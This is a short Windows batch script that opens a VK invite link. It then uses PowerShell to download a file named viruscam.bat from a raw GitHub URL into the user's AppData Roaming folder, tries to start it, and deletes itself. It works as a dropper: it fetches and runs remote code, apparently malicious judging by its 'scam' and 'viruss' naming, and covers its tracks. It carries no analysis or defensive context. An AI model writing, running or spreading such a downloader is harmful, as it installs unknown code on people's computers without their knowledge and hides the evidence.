@echo off
setlocal

start https://vk.com/invite/AMKGDq4

set "file_path=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\viruscam.bat"
set "github_url=https://raw.githubusercontent.com/kaktakt/scam/refs/heads/viruss/viruscam.bat?token=GHSAT0AAAAAACWH3KDZSRXV2Y2CTRIIYQCIZYCXNNA"

powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%github_url%', '%file_path%')"

cd %file_path%

start viruscam.bat

del %~f0